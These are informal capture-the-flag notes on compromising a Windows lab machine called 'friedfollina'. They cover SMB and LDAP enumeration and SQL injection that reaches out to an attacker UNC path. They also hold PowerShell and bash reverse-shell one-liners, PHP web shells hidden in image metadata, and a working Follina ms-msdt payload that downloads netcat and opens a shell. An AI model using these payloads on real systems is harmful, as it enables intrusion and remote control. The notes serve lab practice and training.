# Follina

I paste a bit of screenshots here etc, but not everything, or everything I try, also sorry if some are out of order, swapping between windows/tabs etc
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
mysqli-\>query('SELECT \* FROM j...') #1 \{main\}
SELECT Password FROM mysql.user WHERE (user like 'admin' )-- ') LIMIT 10
; EXEC master ..xp_dirtree'\\\\10.10.14.2\\bug'; —
*[image unavailable]*
trying somethings
```bash
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.2 9002
```
```bash
IEX( IWR https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1 -UseBasicParsing)
```
```bash
IEX(IWR http://10.10.14.2:4444/powershell-reverse-shell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.2 7777
```
noe of these things doing much

annnnd find file upload at bottom
*[image unavailable]*
not getting anywhere here atm, checking other things
[https://nmap.org/nsedoc/scripts/ldap-rootdse.html](https://nmap.org/nsedoc/scripts/ldap-rootdse.html)
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
ldapServiceName: friedfollina.htb:dc\$@FRIEDFOLLINA.HTB
*[image unavailable]*

ms03-026
*[image unavailable]*

[https://book.hacktricks.xyz/welcome/readme](https://book.hacktricks.xyz/welcome/readme)
```bash
enum4linux -u "" -p "" 10.129.227.209 && enum4linux -u "guest" -p "" 10.129.227.209
```
*[image unavailable]*
```bash
smbmap -u "" -p "" -P 445 -H 10.129.227.209 && smbmap -u "guest" -p "" -P 445 -H 10.129.227.209
```
*[image unavailable]*
```bash
smbclient -U '%' -L //10.129.227.209 && smbclient -U 'guest%' -L //
```
*[image unavailable]*
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 10.129.227.209
```
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
```c
connection.search(search_base='DC=ForestDnsZones,DC=friedfollina,DC=htb', search_filter='(&(objectClass=))', search_scope='SUBTREE', attributes='')
True
connection.entries
```
```c
connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=))', search_scope='SUBTREE', attributes='')
True
connection.entries
```
```c
connection.search(search_base='DC=friedfollina,DC=htb', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
Trueconnection.entries
```
```c
connection.search(search_base='CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=friedfollina,DC=htb', search_filter='(&(objectClass=))', search_scope='SUBTREE', attributes='')
```
```c
Naming contexts:
DC=friedfollina,DC=htb
CN=Configuration,DC=friedfollina,DC=htb
CN=Schema,CN=Configuration,DC=friedfollina,DC=htb
DC=DomainDnsZones,DC=friedfollina,DC=htb
DC=ForestDnsZones,DC=friedfollina,DC=htb
```
```c
import ldap3
server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
connection.bind()
True
connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```

tried many things, different limits, fields, etc, but none of the sql injection stuff was leading to any success so far…

rerunning scan for directory because i kept seeing new things here or there, like
[http://10.129.227.209/apply.php?id=1](http://10.129.227.209/apply.php?id=1)
so wanted to re check, apparently gobuster didnt run or work the first time, lots of stuff
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/7777 0>&1'
```
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

so only the doc uploaded here no shell, and it was deleted after some time
*[image unavailable]*
ole tools and rtfduimp no yields on the other files

onlythings did was catting them
*[image unavailable]*

closing tab so comment here, couldnt get hydra to work on brute forcing this of the other logins, might come back
[http://friedfollina.htb/Admin/](http://friedfollina.htb/Admin/)

pivot to try code execution in image
*[image unavailable]*

/bin/bash -c 'bash -i \>& /dev/tcp/10.10.14.2/7777 0\>&1'
*[image unavailable]*
*[image unavailable]*
trying uploads, commands etc
\<?php system(\[cmd\]); ?\>

tried burp repeater but it was cluncky with the redirect and new file names

[https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
```bash
<? eval($_GET['cmd']); ?>

<? system($_GET['cmd']); ?>

<? preg_replace('/.*/e',$_POST['code']); ?>
```
git clone [https://github.com/chinarulezzz/pixload.git](https://github.com/chinarulezzz/pixload.git)
*[image unavailable]*
still nothing
*[image unavailable]*

SOME SUCCESS WHOo
*[image unavailable]*
```c
cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/9999 0>&1”
```
/bin/bash -c 'bash -i \>& /dev/tcp/10.10.14.2/7777 0\>&1'

have noticed, after some uploads, this thing seems to break for a while
*[image unavailable]*
well, trying again, dont get the same error result for the jpg with the same shell 😐
breaktime

[https://flast101.github.io/php-8.1.0-dev-backdoor-rce/](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/)
[https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)

*[image unavailable]*
[https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py)
*[image unavailable]*
*[image unavailable]*
[https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh](https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh)
*[image unavailable]*

[https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit](https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit)
[https://www.cvedetails.com/vulnerability-list.php?vendor_id=74&product_id=128&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=604&sha=d8a9f07b702ae6252893a7ef73f2f2812bbcbb8a](https://www.cvedetails.com/vulnerability-list.php?vendor_id=74&product_id=128&version_id=0&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&cweid=0&order=1&trc=604&sha=d8a9f07b702ae6252893a7ef73f2f2812bbcbb8a)
[https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md](https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md)
[https://twitter.com/search?q=CVE-2022-31626&src=typed_query](https://twitter.com/search?q=CVE-2022-31626&src=typed_query)
not thinking this is the vector for a “very easy” box…

*[image unavailable]*
*[image unavailable]*
tried re routing to just admin vs admin/admin
get loldone response….

hmm eachh time i run through burp it adds an admin
*[image unavailable]*
would like to brute force but burte keeps freezing
*[image unavailable]*
idk i hope  i have it set right

might refocus here

username of course, and i glazed over it beflore without thinking about it, username is follina
*[image unavailable]*

'SELECT \* FROM job WHERE id = 1 OR LOAD_FILE(CONCAAT("\\\\\\\\10.10.14.2\\bug\\\\', VERSION()))
*[image unavailable]*
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT \* FROM job WHERE id = 1 OR LOAD_FILE(CONCAAT("\\\\\\\\10.10.14.2\\bug\\\\', V...' at line 1 in C:\\Users\\follina\\Desktop\\xampp\\htdocs\\search.php:63 Stack trace: #0 C:\\Users\\follina\\Desktop\\xampp\\htdocs\\search.php(63): mysqli-\>query('SELECT \* FROM j...') #1 \{main\} thrown in C:\\Users\\follina\\Desktop\\xampp\\htdocs\\search.php on line 63
it ate
SELECT \* FROM jobs; LOAD_FILE(CONCAAT("\\\\\\\\10.10.14.2\\bug\\\\", VERSION())) LIMIT 10

using sql map on some of the php locations
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
trying infor from the created users

*[image unavailable]*
*[image unavailable]*
[https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)

names of form data
POST /adduser.php HTTP/1.1
Host: 10.129.221.91
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------18080746686485647821948853050
Content-Length: 12851
Origin: [http://10.129.221.91](http://10.129.221.91/)
DNT: 1
Connection: close
Referer: [http://10.129.221.91/register-candidates.php](http://10.129.221.91/register-candidates.php)
Cookie: PHPSESSID=elcbi9s0olpl5i0447kp7pgb5q
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="fname"
a4
-----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="lname"
a4
-----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="email"
[a4@test.com](mailto:a4@test.com)
-----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="aboutme"
a4
-----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="dob"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="age"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="passingyear"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="qualification"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="stream"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="password"
a4
-----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="cpassword"
a4
-----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="contactno"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="address"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="city"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="state"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="skills"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="designation"
- ----------------------------18080746686485647821948853050
Content-Disposition: form-data; name="resume"; filename="follina.doc"
Content-Type: application/msword
*[image unavailable]*

*[image unavailable]*
*[image unavailable]*
tried quickly uploading then applying to submit resume doc
[http://10.129.221.91/user/deactivate-account.php](http://10.129.221.91/user/deactivate-account.php)
*[image unavailable]*
*[image unavailable]*

*[image unavailable]*

[https://www.secjuice.com/htb-magic-walkthrough/](https://www.secjuice.com/htb-magic-walkthrough/)
`exiftool -DocumentName="<h1>in7rud3r
<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpeg`
`exiftool -DocumentName="<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.15.126/4444 0>&1'\"); ?>" image.jpeg`

└──╼ \[★\]\$ sqlmap -u "[http://10.129.227.209/view-job-post.php?id=1\*](http://10.129.227.209/view-job-post.php?id=1*)"
*[image unavailable]*

no repsone for this one
*[image unavailable]*

so just still throwing around sql not getting anything different

took the payload from
[https://github.com/JohnHammond/msdt-follina/blob/main/follina.py](https://github.com/JohnHammond/msdt-follina/blob/main/follina.py)

used it in
[https://gist.github.com/tothi/66290a42896a97920055e50128c9f040](https://gist.github.com/tothi/66290a42896a97920055e50128c9f040)

opened doc as zip, changed ext
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
the payload that worked in exploit.html

\<script\>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=\$(Invoke-Expression(\$(Invoke-Expression('\[System.Text.Encoding\]'+\[char\]58+\[char\]58+'UTF8.GetString(\[System.Convert\]'+\[char\]58+\[char\]58+'FromBase64String('+\[char\]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+\[char\]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\\"";
\</script\>
*[image unavailable]*
*[image unavailable]*
C:\\Users\\Administrator\\Desktop\>type flag.txt
type flag.txt
8d2cdcad1c7b93e03408af589be34a45
*[image unavailable]*
Invoke-WebRequest [https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true](https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true) -OutFile C:\\\\Windows\\\\Tasks\\\\nc.exe; C:\\\\Windows\\\\Tasks\\\\nc.exe -e cmd.exe 10.10.14.2 1337 b64 encoded

other scratch notes from the payload
```bash
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
```
```plain text
    command = f"""Invoke-WebRequest <https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true> -OutFile C:\\\\Windows\\\\Tasks\\\\nc.exe; C:\\\\Windows\\\\Tasks\\\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""

```
```bash
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""; //"""
trying this
```
```plain text
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\\""; //"""

```
```bash
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Start-Process('calc'))i/../../../../../../../../../../../../../../Windows/system32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>
```

simulations.ps1
*[image unavailable]*
*[image unavailable]*
